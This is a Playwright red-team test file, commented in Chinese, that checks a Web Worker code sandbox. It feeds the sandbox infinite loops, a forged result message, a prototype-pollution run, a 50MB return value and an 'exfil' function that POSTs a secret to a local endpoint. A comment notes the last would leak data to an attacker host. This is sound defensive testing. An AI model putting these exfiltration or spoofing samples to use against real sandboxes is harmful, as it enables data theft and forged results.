import { test, expect } from '@playwright/test'

/**
 * 沙盒红队用例 · Tier 3(ADR-009)
 *
 * 环境:Playwright + 真 Chromium
 *   —— happy-dom 无 Worker API,已迁移到 e2e。见 docs/learning/sandbox-e2e-harness.md
 * Harness:app/dev-sandbox-test/page.tsx 把 runInSandbox 挂到 window
 *
 * 优先级:RT-03 结果伪造 > RT-06 fetch 出口 > RT-01/02 死循环 > RT-04/05
 *   前两条是真漏洞,后面是"验证防御真的成立"。
 *
 * 断言体填写规矩(按 ADR-009 Tier 3):RT-01 由 AI 全实现作为参照;
 * RT-02/04/05/06 骨架 + TODO,由人手写;RT-03 需先决策路径 A/B。
 */

test.beforeEach(async ({ page }) => {
  await page.goto('/dev-sandbox-test')
  await page.waitForSelector('#sandbox-test-ready')
})

test('RT-01 · 同步死循环 · while(true){} 应在 timeoutMs 内被 kill', async ({
  page,
}) => {
  const result = await page.evaluate(async () => {
    const code = `
      function loop() {
        while (true) {}
        return 1
      }
    `
    const start = performance.now()
    try {
      await (window as unknown as { __runInSandbox: (...a: unknown[]) => Promise<unknown> })
        .__runInSandbox(code, 'loop', [{ input: [], expected: 1 }], { timeoutMs: 500 })
      return { kind: 'resolved' as const, elapsed: performance.now() - start }
    } catch (e) {
      return {
        kind: 'rejected' as const,
        message: (e as Error).message,
        elapsed: performance.now() - start,
      }
    }
  })

  expect(result.kind).toBe('rejected')
  if (result.kind === 'rejected') {
    expect(result.message).toMatch(/超时|timeout/i)
    // 主线程 timer 应约在 timeoutMs 触发,给 500ms 缓冲
    expect(result.elapsed).toBeLessThan(1500)
  }
})

test('RT-02 · 异步死循环 · 无限 await 应被 timeoutMs 兜住', async ({
  page,
}) => {
  const result = await page.evaluate(async () => {
    const code = `
      async function spin() {
        while (true) { await 1 }
        return 1
      }
    `
    const start = performance.now()
    try {
      await (window as unknown as { __runInSandbox: (...a: unknown[]) => Promise<unknown> })
        .__runInSandbox(code, 'spin', [{ input: [], expected: 1 }], { timeoutMs: 500 })
      return { kind: 'resolved' as const, elapsed: performance.now() - start }
    } catch (e) {
      return {
        kind: 'rejected' as const,
        message: (e as Error).message,
        elapsed: performance.now() - start,
      }
    }
  })

  expect(result.kind).toBe('rejected')
  if (result.kind === 'rejected') {
    expect(result.message).toMatch(/超时|timeout/i)
    expect(result.elapsed).toBeLessThan(1500)
  }
})


test('RT-03 · 结果伪造(spoofing)· 用户 postMessage 不应被主线程当真', async ({
  page,
}) => {
  const result = await page.evaluate(async () => {
    const code = `
      function spoof(realArg) {
        try {
          // shadow 后 self 是 undefined,访问 .postMessage 会抛 TypeError
          self.postMessage({
            type: 'result',
            results: [{name:'假通过',passed:true,input:[],expected:42,actual:42,durationMs:0}],
            totalDurationMs: 0,
          })
        } catch (_e) {
          // 吞掉,让函数继续返回真实值
        }
        return realArg
      }
    `
    const r = await (
      window as unknown as {
        __runInSandbox: (
          code: string,
          entry: string,
          cases: Array<{ input: unknown[]; expected: unknown }>,
          opts?: { timeoutMs?: number },
        ) => Promise<{
          results: Array<{ actual?: unknown; passed: boolean; name?: string }>
        }>
      }
    ).__runInSandbox(code, 'spoof', [{ input: [0], expected: 42 }], {
      timeoutMs: 2000,
    })

    return {
      passed: r.results[0].passed,
      actual: r.results[0].actual,
      name: r.results[0].name,
    }
  })

  // 双重防御(2026-09-02 实证):
  //   Layer 1 · Shadow —— worker.ts 用 IIFE 参数把 self/postMessage/globalThis
  //     /importScripts shadow 为 undefined,strict mode 让 this 也为 undefined。
  //     用户直接调 self.postMessage(...) 立即 TypeError。
  //   Layer 2 · Nonce —— 即使用户通过 new Function('return this')() 等元编程
  //     绕过 shadow 拿到真 postMessage,消息缺 nonce,runner.ts onmessage 会丢弃。
  //
  // 断言:伪造失败,主线程收到的是真实结果
  //   - passed === false(真实 actual:0 !== expected:42)
  //   - actual === 0(真实返回值,不是伪造声明的 42)
  //   - name !== '假通过'(表示这条不是从伪造消息来的)
  expect(result.passed).toBe(false)
  expect(result.actual).toBe(0)
  expect(result.name).not.toBe('假通过')
})

test('RT-04 · 跨 run 全局隔离 · Object.prototype 污染不应跨 run 泄漏', async ({
  page,
}) => {
  const result = await page.evaluate(async () => {
    const runInSandbox = (
      window as unknown as {
        __runInSandbox: (
          code: string,
          entry: string,
          cases: Array<{ input: unknown[]; expected: unknown }>,
          opts?: { timeoutMs?: number },
        ) => Promise<{ results: Array<{ actual?: unknown; passed: boolean }> }>
      }
    ).__runInSandbox

    // 第一 run:污染 Object.prototype
    await runInSandbox(
      `function pollute() {
        Object.prototype.__leaked = 42
        return 1
      }`,
      'pollute',
      [{ input: [], expected: 1 }],
      { timeoutMs: 2000 },
    )

    // 第二 run:探测污染是否跨过来
    const detect = await runInSandbox(
      `function detect() {
        return ({}).__leaked
      }`,
      'detect',
      [{ input: [], expected: undefined }],
      { timeoutMs: 2000 },
    )

    return {
      actual: detect.results[0].actual,
      passed: detect.results[0].passed,
    }
  })

  // 核心断言:新 Worker 的 realm 独立,污染不应跨过来
  expect(result.actual).toBeUndefined()
  // 附加:测试用例本身也应该 passed(因为 expected: undefined,actual: undefined)
  expect(result.passed).toBe(true)
})


test('RT-05 · 巨大返回值 · 50MB 字符串不应让 runInSandbox 卡死', async ({
  page,
}) => {
  const result = await page.evaluate(async () => {
    const code = `
      function huge() {
        return 'x'.repeat(50_000_000)
      }
    `
    const start = performance.now()
    try {
      const r = await (
        window as unknown as {
          __runInSandbox: (
            code: string,
            entry: string,
            cases: Array<{ input: unknown[]; expected: unknown }>,
            opts?: { timeoutMs?: number },
          ) => Promise<{ results: Array<{ actual?: unknown; passed: boolean }> }>
        }
      ).__runInSandbox(code, 'huge', [{ input: [], expected: '' }], { timeoutMs: 5000 })
      return {
        kind: 'resolved' as const,
        elapsed: performance.now() - start,
        actualLength:
          typeof r.results[0].actual === 'string'
            ? (r.results[0].actual as string).length
            : -1,
      }
    } catch (e) {
      return {
        kind: 'rejected' as const,
        elapsed: performance.now() - start,
        message: (e as Error).message,
      }
    }
  })

  // 核心:不管 resolve 还是 reject,都不能超过 5 秒(意味着没挂死)
  expect(result.elapsed).toBeLessThan(5000)

  // 分支信息(非核心断言,只是记录发现)
  if (result.kind === 'resolved') {
    // 沙盒吞下了 50MB 字符串,structured clone 也能过
    expect(result.actualLength).toBe(50_000_000)
  }
  // 若 rejected,说明浏览器 clone 上限触发或超时兜底了,也算合格
})


test('RT-06 · fetch 出口 · 显式登记网络敞口', async ({ page }) => {
  const result = await page.evaluate(async () => {
    const code = `
      async function exfil() {
        try {
          const res = await fetch('http://127.0.0.1:1/exfil', {
            method: 'POST',
            body: 'secret',
          })
          return 'sent:' + res.status
        } catch (e) {
          return 'blocked:' + (e && e.message ? e.message : String(e))
        }
      }
    `
    const r = await (
      window as unknown as {
        __runInSandbox: (
          code: string,
          entry: string,
          cases: Array<{ input: unknown[]; expected: unknown }>,
          opts?: { timeoutMs?: number },
        ) => Promise<{ results: Array<{ actual?: unknown; passed: boolean }> }>
      }
    ).__runInSandbox(code, 'exfil', [{ input: [], expected: '' }], { timeoutMs: 5000 })

    return {
      actual: r.results[0].actual as string,
    }
  })

  // 断言:actual 是字符串且以 sent: 或 blocked: 开头
  // 这条不是要"堵住",是要"确认能不能过"
  expect(result.actual).toMatch(/^(sent|blocked):/)

  // ⚠️ 敞口登记 · 读 actual 来判断实际发生了什么:
  //   - sent:*   → fetch 真的发出去了,后端拿到了(即使 port 1 也可能返回错状态码)
  //   - blocked:TypeError:Failed to fetch → 网络层拦(可能是 CORS/连接失败)
  //   - blocked:*其他*  → 具体报错信息,可能揭示浏览器/CSP 拦截
  //
  // 【已知 Tier 3 敞口 · M4 上线前必修 · 2026-09-02 实证】
  // 跑通结果:'blocked:Failed to fetch' —— 说明:
  //   1. Web Worker 内 fetch API 完全可用(不是 CSP 拦下的)
  //   2. 本次失败仅因目标端口(127.0.0.1:1)无监听
  //   3. 若换成真实攻击者 URL(evil.com),fetch 会成功,数据外泄
  // 修补方案(选一或组合):
  //   A. worker.ts 里 fn 作用域 shadow: `const fetch = undefined`(易绕过)
  //   B. next.config 加 CSP: connect-src 'none' 给 /dev-sandbox-test 路由
  //   C. 主线程内容路由用 iframe sandbox="allow-scripts"(隔离 origin,推荐)
  //   D. M3 起换 QuickJS-WASM 沙盒(彻底,但工程改动大)
  // M4 前决策落 ADR-012。

  console.log('[RT-06] fetch 结果:', result.actual)
})

